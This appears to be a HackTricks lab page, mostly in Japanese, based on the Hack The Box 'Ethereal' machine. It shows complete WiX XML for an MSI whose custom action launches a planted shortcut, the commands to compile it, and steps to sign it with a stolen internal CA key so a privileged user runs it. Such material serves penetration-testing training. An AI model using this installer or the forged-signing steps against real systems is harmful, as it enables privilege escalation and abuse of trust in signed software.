# WiXでカスタムアクション MSIを作成する

{{#include ../../banners/hacktricks-training.md}}

この歴史的な Hack The Box のチェーンでは、WiX Toolset v3を使用して、あらかじめ配置された `.lnk` ファイルを起動する MSIを構築しました。**MSIは自動的に特権付きになるわけではありません**。実行は、Windows Installerのポリシー、custom-actionの属性、およびインストールするユーザーによって選択されたコンテキストで行われます。dシナリオでは、攻撃者は信頼された署名CAも盗み、別のユーザーが監視しているフォルダに署名済みのMSIを配置しました。<sup>[[1]](#references)[[3]](#references)</sup>

wix MSIの使用例を包括的に理解するには、[このページ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)を参照することを推奨します。ここでは、wix MSIの使用方法を示すさまざまな例を確認できます。<sup>[[2]](#references)</sup>

MSIは `C:\Users\Public\Desktop\Shortcuts\rick.lnk` を実行します。元のWiX v3 XMLを以下に保存しています。<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` は最小 Windows Installer バージョンを宣言し、`Compressed="yes"` はパッケージが圧縮されていることを示します。`Stage1` は deferred ですが、`Impersonate="yes"` が設定されているため、インストールを実行するユーザーの impersonated token で実行されます。このシナリオで privilege が変更されたのは、後から MSI を開いた privileged user によるものであり、この属性が魔法のように SYSTEM を付与したわけではありません。<sup>[[3]](#references)</sup>

`candle.exe` を使用してソースを WiX object にコンパイルします。<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
`light.exe` でそのオブジェクトを MSI にリンクします：<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### 元の chain で使用された signing step

対象の workflow は、侵害された internal CA によって署名された package を受け入れていました。この write-up では、復元された `MyCA.cer`/`MyCA.pvk` から signing certificate を作成し、PFX を作成して MSI に署名しました。<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
The attacker then placed the signed package in `D:\DEV\MSIs` and waited for the privileged workflow/user to execute it. Preserve that precondition when adapting the technique: without an elevated installation path, unsafe policy such as `AlwaysInstallElevated`, or a privileged victim, this package executes only with the current user's rights.

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)

{{#include ../../banners/hacktricks-training.md}}
